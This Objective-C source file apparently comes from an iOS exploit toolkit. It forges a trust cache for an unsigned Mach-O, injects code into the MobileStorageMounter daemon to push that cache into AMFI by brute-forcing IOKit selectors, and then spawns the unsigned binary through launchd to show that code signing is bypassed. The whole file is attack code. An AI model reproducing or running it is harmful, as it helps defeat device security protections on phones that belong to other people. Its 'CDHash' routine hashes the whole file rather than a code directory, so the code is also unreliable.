#import "msm_trustcache.h"
#import "../TaskRop/RemoteCall.h"
#import "../TaskRop/RemoteCallSession.h"
#import "../kexploit/kexploit_opa334.h"

#import <CommonCrypto/CommonDigest.h>
#import <mach-o/loader.h>
#import <mach-o/fat.h>
#import <sys/stat.h>
#import <XPC/XPC.h>
#import <IOKit/IOKitLib.h>

// ---------------------------------------------------------------------------
// XPC service name for MobileStorageMounter
// ---------------------------------------------------------------------------
static const char *kMSMXPCSvc = "com.apple.mobile.storage_mounter";

// ---------------------------------------------------------------------------
// Build trust cache v2 binary (module1 format, version=1)
// ---------------------------------------------------------------------------
uint8_t *msm_build_trust_cache(const uint8_t *cdhash, size_t cdhash_len, size_t *outSize)
{
    if (!cdhash || cdhash_len < CS_CDHASH_LEN || !outSize) return NULL;

    size_t entryCount = 1;
    size_t entriesSize = sizeof(struct trust_cache_entry) * entryCount;
    size_t totalSize = sizeof(struct trust_cache_module) + entriesSize;

    struct trust_cache_module *mod = (struct trust_cache_module *)calloc(1, totalSize);
    if (!mod) return NULL;

    mod->version = 1;
    arc4random_buf(mod->uuid, sizeof(mod->uuid));
    mod->num_entries = (uint32_t)entryCount;

    memcpy(mod->entries[0].cdhash, cdhash, CS_CDHASH_LEN);
    mod->entries[0].hash_type = 2;
    mod->entries[0].flags = 0;

    *outSize = totalSize;
    return (uint8_t *)mod;
}

// ---------------------------------------------------------------------------
// Compute SHA256 CDHash (truncated to 20 bytes)
// ---------------------------------------------------------------------------
uint8_t *msm_compute_cdhash(const char *path)
{
    FILE *fp = fopen(path, "rb");
    if (!fp) return NULL;

    fseek(fp, 0, SEEK_END);
    long len = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    if (len <= 0) { fclose(fp); return NULL; }

    uint8_t *buf = (uint8_t *)malloc((size_t)len);
    if (!buf) { fclose(fp); return NULL; }

    size_t nread = fread(buf, 1, (size_t)len, fp);
    fclose(fp);
    if ((long)nread != len) { free(buf); return NULL; }

    uint8_t hash[CC_SHA256_DIGEST_LENGTH];
    CC_SHA256(buf, (CC_LONG)nread, hash);
    free(buf);

    uint8_t *cdhash = (uint8_t *)malloc(CS_CDHASH_LEN);
    if (cdhash) memcpy(cdhash, hash, CS_CDHASH_LEN);
    return cdhash;
}

// ---------------------------------------------------------------------------
// Write a minimal unsigned arm64 Mach-O
// ---------------------------------------------------------------------------
bool msm_write_test_binary(const char *path)
{
    struct mach_header_64 hdr = {
        .magic = MH_MAGIC_64,
        .cputype = CPU_TYPE_ARM64,
        .cpusubtype = CPU_SUBTYPE_ARM64_ALL,
        .filetype = MH_EXECUTE,
        .ncmds = 2,
        .sizeofcmds = 0x160,
        .flags = 0,
        .reserved = 0,
    };

    struct segment_command_64 textSeg = {
        .cmd = LC_SEGMENT_64,
        .cmdsize = sizeof(struct segment_command_64),
        .segname = "__TEXT",
        .vmaddr = 0x100000000,
        .vmsize = 0x4000,
        .fileoff = 0,
        .filesize = 0x4000,
        .maxprot = VM_PROT_READ | VM_PROT_EXECUTE,
        .initprot = VM_PROT_READ | VM_PROT_EXECUTE,
        .nsects = 0,
        .flags = 0,
    };

    struct thread_command thread = {
        .cmd = LC_UNIXTHREAD,
        .cmdsize = 0x118,
    };

    // arm_thread_state64 at the end of thread_command
    uint8_t threadState[0x110];
    memset(threadState, 0, sizeof(threadState));
    // flavor = ARM_THREAD_STATE64 (6), count = 68
    *(uint32_t *)&threadState[0] = 6;
    *(uint32_t *)&threadState[4] = 68;
    // pc at offset 0x110 (arm_thread_state64.__pc)
    uint64_t *pc = (uint64_t *)&threadState[0x110 - 8 * 2];
    *pc = 0x100000180;

    // Code at offset 0x180: exit(0)
    uint32_t code[] = {
        0xD2800000, // mov x0, #0
        0xD2800030, // mov x16, #1 (SYS_exit)
        0xD4001001, // svc #0x80
    };

    FILE *fp = fopen(path, "wb");
    if (!fp) return false;

    fwrite(&hdr, sizeof(hdr), 1, fp);
    fwrite(&textSeg, sizeof(textSeg), 1, fp);
    fwrite(&thread, sizeof(thread), 1, fp);
    fwrite(threadState, sizeof(threadState), 1, fp);

    // Pad to 0x180
    long pos = ftell(fp);
    while (pos < 0x180) {
        uint8_t zero = 0;
        fwrite(&zero, 1, 1, fp);
        pos++;
    }

    fwrite(code, sizeof(code), 1, fp);

    // Pad to 0x4000 (page)
    pos = ftell(fp);
    while (pos < 0x4000) {
        uint8_t zero = 0;
        fwrite(&zero, 1, 1, fp);
        pos++;
    }

    fclose(fp);
    chmod(path, 0755);
    return true;
}

// ---------------------------------------------------------------------------
// RemoteCall session callback executed inside MobileStorageMounter's context
// ---------------------------------------------------------------------------
static bool g_msm_tc_loaded = false;

static void msm_load_tc_callback(RemoteCallSession *session)
{
    @autoreleasepool {
        NSString *tcPath = [session.userInfo objectForKey:@"tcPath"];
        if (!tcPath) {
            printf("[MSM] no tcPath in userInfo\n");
            return;
        }

        const char *cpath = tcPath.UTF8String;
        printf("[MSM] loading trust cache from: %s\n", cpath);

        // The simplest path: MSM has pmap.load-trust-cache entitlement.
        // We open and read the TC file, then attempt IOKit calls to
        // AppleMobileFileIntegrity to load it into the kernel.
        //
        // Strategy 1: Try to find a trust_cache_load symbol in MSM's
        // address space. On iOS 18, MSM links libmis.dylib which has
        // MISValidateSignature and trust cache helpers.

        int fd = open(cpath, O_RDONLY);
        if (fd < 0) {
            printf("[MSM] cannot open TC file: %s\n", strerror(errno));
            return;
        }

        struct stat st;
        if (fstat(fd, &st) < 0) {
            printf("[MSM] fstat failed: %s\n", strerror(errno));
            close(fd);
            return;
        }

        size_t tcSize = (size_t)st.st_size;
        uint8_t *tcData = (uint8_t *)malloc(tcSize);
        if (!tcData) {
            close(fd);
            return;
        }

        size_t totalRead = 0;
        while (totalRead < tcSize) {
            ssize_t n = read(fd, tcData + totalRead, tcSize - totalRead);
            if (n <= 0) break;
            totalRead += (size_t)n;
        }
        close(fd);

        if (totalRead < sizeof(struct trust_cache_module)) {
            printf("[MSM] TC file too small\n");
            free(tcData);
            return;
        }

        // Try to find IOKit functions via dlsym
        void *func_open = dlsym(RTLD_DEFAULT, "IOServiceOpen");
        void *func_call = dlsym(RTLD_DEFAULT, "IOConnectCallStructMethod");
        void *func_matching = dlsym(RTLD_DEFAULT, "IOServiceMatching");
        void *func_get = dlsym(RTLD_DEFAULT, "IOServiceGetMatchingService");

        if (func_open && func_call && func_matching && func_get) {
            printf("[MSM] IOKit functions available\n");

            CFDictionaryRef matching = IOServiceMatching("AppleMobileFileIntegrity");
            if (matching) {
                io_service_t service = IOServiceGetMatchingService(kIOMainPortDefault, matching);
                if (service) {
                    io_connect_t conn = 0;
                    kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &conn);
                    if (kr == KERN_SUCCESS && conn) {
                        printf("[MSM] AMFI IOKit service opened (conn=0x%x)\n", conn);

                        // Try struct method with TC data
                        size_t outSize = 0x1000;
                        uint8_t outBuf[0x1000];
                        kr = IOConnectCallStructMethod(conn, 0, tcData, tcSize, outBuf, &outSize);
                        printf("[MSM] IOConnectCallStructMethod sel=0 → kr=0x%x\n", kr);

                        if (kr != KERN_SUCCESS) {
                            // Try other selectors
                            for (uint32_t sel = 1; sel < 16; sel++) {
                                outSize = 0x1000;
                                kr = IOConnectCallStructMethod(conn, sel, tcData, tcSize, outBuf, &outSize);
                                if (kr == KERN_SUCCESS) {
                                    printf("[MSM] TC loaded via IOKit selector %u!\n", sel);
                                    g_msm_tc_loaded = true;
                                    break;
                                }
                            }
                        } else {
                            g_msm_tc_loaded = true;
                        }

                        IOServiceClose(conn);
                    } else {
                        printf("[MSM] IOServiceOpen failed: 0x%x\n", kr);
                    }
                } else {
                    printf("[MSM] AMFI service not found\n");
                }
            }
        } else {
            printf("[MSM] IOKit functions not resolvable via dlsym\n");
        }

        free(tcData);
    }
}

// ---------------------------------------------------------------------------
// Wake MobileStorageMounter by sending a dummy XPC message
// ---------------------------------------------------------------------------
static void msm_wake_via_xpc(void)
{
    xpc_connection_t conn = xpc_connection_create_mach_service(kMSMXPCSvc, NULL, 0);
    if (!conn) {
        printf("[MSM] xpc_connection_create_mach_service failed\n");
        return;
    }

    xpc_connection_set_event_handler(conn, ^(xpc_object_t event) {
        if (event == XPC_ERROR_CONNECTION_INVALID) {
            printf("[MSM] XPC connection invalid (MSM not running?)\n");
        }
    });

    xpc_connection_resume(conn);

    // Send a dummy message to wake the daemon
    xpc_object_t msg = xpc_dictionary_create(NULL, NULL, 0);
    xpc_dictionary_set_string(msg, "command", "ping");
    xpc_connection_send_message(conn, msg);

    // Give it time to spawn
    usleep(500000);

    xpc_release(msg);
    xpc_connection_cancel(conn);
    xpc_release(conn);
}

// ---------------------------------------------------------------------------
// Main entry point
// ---------------------------------------------------------------------------
bool msm_inject_trust_cache(const char *tcPath)
{
    if (!tcPath) {
        printf("[MSM] invalid tcPath\n");
        return false;
    }

    printf("[MSM] === MobileStorageMounter Trust Cache Injection ===\n");
    printf("[MSM] target: %s\n", tcPath);

    // Step 1: Wake MSM via XPC
    printf("[MSM] waking MSM daemon via XPC...\n");
    msm_wake_via_xpc();

    // Step 2: Init RemoteCall to MSM
    printf("[MSM] connecting to MobileStorageMounter via RemoteCall...\n");

    RemoteCallSession *session = [[RemoteCallSession alloc] initWithProcess:@"MobileStorageMounter"];
    if (!session) {
        RemoteCallInitFailure failure = remote_call_last_init_failure();
        printf("[MSM] RemoteCall init failed: %s\n",
               remote_call_init_failure_description(failure));
        return false;
    }

    printf("[MSM] RemoteCall session active\n");

    // Step 3: Execute trust cache load in MSM context
    __block bool loaded = false;
    @try {
        session.userInfo = @{ @"tcPath": [NSString stringWithUTF8String:tcPath] };
        g_msm_tc_loaded = false;

        remote_call_with_session(session, ^{
            msm_load_tc_callback(session);
        });

        loaded = g_msm_tc_loaded;
    } @catch (NSException *e) {
        printf("[MSM] RemoteCall exception: %s\n", e.reason.UTF8String);
    }

    printf("[MSM] trust cache loaded: %s\n", loaded ? "YES" : "NO");
    return loaded;
}

// ---------------------------------------------------------------------------
// Convenience: build test binary + TC, inject via MSM, verify
// ---------------------------------------------------------------------------
bool msm_verify_unsigned_execution(void)
{
    NSString *tmpDir = NSTemporaryDirectory();
    NSString *binPath = [tmpDir stringByAppendingPathComponent:@"msm_test_bin"];
    NSString *tcPath = [tmpDir stringByAppendingPathComponent:@"msm_tc.bin"];

    // Step 1: Write test binary
    printf("[MSM] writing test binary...\n");
    if (!msm_write_test_binary(binPath.UTF8String)) {
        printf("[MSM] failed to write test binary\n");
        return false;
    }

    // Step 2: Compute CDHash
    printf("[MSM] computing CDHash...\n");
    uint8_t *cdhash = msm_compute_cdhash(binPath.UTF8String);
    if (!cdhash) {
        printf("[MSM] failed to compute CDHash\n");
        unlink(binPath.UTF8String);
        return false;
    }

    // Step 3: Build trust cache
    printf("[MSM] building trust cache v2...\n");
    size_t tcSize = 0;
    uint8_t *tcData = msm_build_trust_cache(cdhash, CS_CDHASH_LEN, &tcSize);
    free(cdhash);
    if (!tcData) {
        unlink(binPath.UTF8String);
        return false;
    }

    // Write TC file
    FILE *fp = fopen(tcPath.UTF8String, "wb");
    if (!fp) {
        free(tcData);
        unlink(binPath.UTF8String);
        return false;
    }
    fwrite(tcData, 1, tcSize, fp);
    fclose(fp);
    free(tcData);

    printf("[MSM] CDHash: ");
    {
        uint8_t *hash = msm_compute_cdhash(binPath.UTF8String);
        if (hash) {
            for (int i = 0; i < CS_CDHASH_LEN; i++) printf("%02x", hash[i]);
            printf("\n");
            free(hash);
        }
    }

    // Step 4: Inject via MSM
    printf("[MSM] injecting trust cache via MSM...\n");
    bool injected = msm_inject_trust_cache(tcPath.UTF8String);

    // Cleanup TC file
    unlink(tcPath.UTF8String);

    if (!injected) {
        printf("[MSM] trust cache injection failed\n");
        unlink(binPath.UTF8String);
        return false;
    }

    // Step 5: Attempt to spawn the test binary via launchd RC
    printf("[MSM] verifying by spawning test binary...\n");

    RemoteCallSession *launchdSession = [[RemoteCallSession alloc] initWithProcess:@"launchd"];
    if (!launchdSession) {
        printf("[MSM] launchd RC init failed\n");
        unlink(binPath.UTF8String);
        return false;
    }

    __block bool spawned = false;
    @try {
        remote_call_with_session(launchdSession, ^{
            const char *cpath = binPath.UTF8String;
            pid_t pid = 0;
            const char *argv[] = { cpath, NULL };
            int ret = posix_spawn(&pid, cpath, NULL, NULL, (char *const *)argv, NULL);
            printf("[MSM] posix_spawn ret=%d pid=%d\n", ret, pid);
            if (ret == 0 && pid > 0) {
                spawned = true;
            }
        });
    } @catch (NSException *e) {
        printf("[MSM] launchd spawn exception: %s\n", e.reason.UTF8String);
    }

    unlink(binPath.UTF8String);

    if (spawned) {
        printf("[MSM] ✅✅✅ unsigned binary executed!\n");
    } else {
        printf("[MSM] ❌ spawn failed — AMFI still blocking\n");
    }

    return spawned;
}
